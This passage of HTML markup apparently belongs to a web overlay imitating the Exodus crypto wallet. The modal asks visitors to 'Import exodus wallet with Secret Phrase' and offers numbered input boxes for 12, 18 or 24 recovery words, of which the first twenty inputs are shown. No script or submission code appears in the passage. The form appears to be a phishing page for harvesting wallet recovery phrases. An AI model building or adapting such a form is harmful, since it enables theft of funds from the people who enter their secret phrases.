177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z"
                   fill="#202020"
                 ></path>
               </svg>
             </div>
             <div>
               <button
                 class="scwtw-p-1 scwtw-rounded-[12px] hover:scwtw-bg-[#f3f3f3] dark:hover:scwtw-bg-[#eaeaea0d] scwtw-transition-all scwtw-duration-300 active:scwtw-scale-95"
                 type="button"
                 id="exodus-close-button1"
               >
                 <svg
                   class="scwtw-w-6 scwtw-h-6 scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                   xmlns="http://www.w3.org/2000/svg"
                   width="24"
                   height="24"
                   viewBox="0 0 24 24"
                   fill="none"
                   stroke="currentColor"
                   stroke-width="2"
                   stroke-linecap="round"
                   stroke-linejoin="round"
                 >
                   <path d="M18 6 6 18"></path>
                   <path d="m6 6 12 12"></path>
                 </svg>
               </button>
             </div>
           </div>
           <div class="scwtw-mt-6">
             <div
               class="scwtw-flex scwtw-flex-col scwtw-items-start scwtw-justify-start scwtw-text-start scwtw-gap-y-1.5"
             >
               <div>
                 <h3
                   class="scwtw-text-[#202020] dark:scwtw-text-[#ffffff] font-inter scwtw-font-bold scwtw-text-[22px]"
                 >
                   Import exodus wallet with Secret Phrase
                 </h3>
               </div>
               <div class="scwtw-mb-1.5">
                 <p
                   class="scwtw-text-[#141618] dark:scwtw-text-[#dddddd] font-inter scwtw-font-normal scwtw-text-[16px]"
                 >
                   Import an existing wallet with your 12, 18 or 24-word
                   secret phrase.
                 </p>
               </div>
               <div
                 class="scwtw-flex scwtw-w-full scwtw-items-center scwtw-p-1 scwtw-gap-x-1.5 scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] scwtw-rounded-[16px]"
               >
                 <div class="scwtw-w-full">
                   <button
                     class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-w-full scwtw-p-2 scwtw-rounded-[16px] scwtw-border scwtw-border-transparent scwtw-bg-[#f3f3f3] dark:scwtw-bg-[#ffffff05] hover:scwtw-opacity-80 scwtw-cursor-pointer scwtw-text-center scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 data-[is-selected=true]:scwtw-border-[#7b7b7b] dark:data-[is-selected=true]:scwtw-border-[#a5a5a5] exodus-switch-words-count-button"
                     id="exodus-switch-words-count-button-12"
                     data-is-selected="true"
                     data-words-count="12"
                   >
                     <div>
                       <span
                         class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                         >12 words</span
                       >
                     </div>
                   </button>
                 </div>
                 <div class="scwtw-w-full">
                   <button
                     class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-w-full scwtw-p-2 scwtw-rounded-[16px] scwtw-border scwtw-border-transparent scwtw-bg-[#f3f3f3] dark:scwtw-bg-[#ffffff05] hover:scwtw-opacity-80 scwtw-cursor-pointer scwtw-text-center scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 data-[is-selected=true]:scwtw-border-[#7b7b7b] dark:data-[is-selected=true]:scwtw-border-[#a5a5a5] exodus-switch-words-count-button"
                     id="exodus-switch-words-count-button-18"
                     data-is-selected="false"
                     data-words-count="18"
                   >
                     <div>
                       <span
                         class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                         >18 words</span
                       >
                     </div>
                   </button>
                 </div>
                 <div class="scwtw-w-full">
                   <button
                     class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-w-full scwtw-p-2 scwtw-rounded-[16px] scwtw-border scwtw-border-transparent scwtw-bg-[#f3f3f3] dark:scwtw-bg-[#ffffff05] hover:scwtw-opacity-80 scwtw-cursor-pointer scwtw-text-center scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 data-[is-selected=true]:scwtw-border-[#7b7b7b] dark:data-[is-selected=true]:scwtw-border-[#a5a5a5] exodus-switch-words-count-button"
                     id="exodus-switch-words-count-button-24"
                     data-is-selected="false"
                     data-words-count="24"
                   >
                     <div>
                       <span
                         class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                         >24 words</span
                       >
                     </div>
                   </button>
                 </div>
               </div>
             </div>
           </div>
           <div class="scwtw-mt-4">
             <div
               class="scwtw-mt-4 scwtw-max-h-[204px] scwtw-overflow-y-auto exodus-custom-scrollbar"
             >
               <div
                 id="exodus-12"
                 class="exodus-container-12-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1"
               >
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         1
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         2
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         3
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         4
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         5
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         6
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         7
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         8
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         9
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         10
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         11
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         12
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
               </div>
               <div
                 id="exodus-18"
                 class="exodus-container-18-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1 scwtw-mt-1 scwtw-hidden"
               >
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         13
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         14
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         15
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         16
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         17
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         18
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
               </div>
               <div
                 id="exodus-24"
                 class="exodus-container-24-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1 scwtw-mt-1 scwtw-hidden"
               >
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         19
                       </p>
                     </div>
                   </div>
                   <input
                     class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] exodus-seed-input"
                     type="text"
                     data-invalid="false"
                   />
                 </div>
                 <div class="scwtw-relative">
                   <div
                     class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                   >
                     <div>
                       <p
                         class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                       >
                         20
                       </p>
                     </div>
                   </div>
                   <input
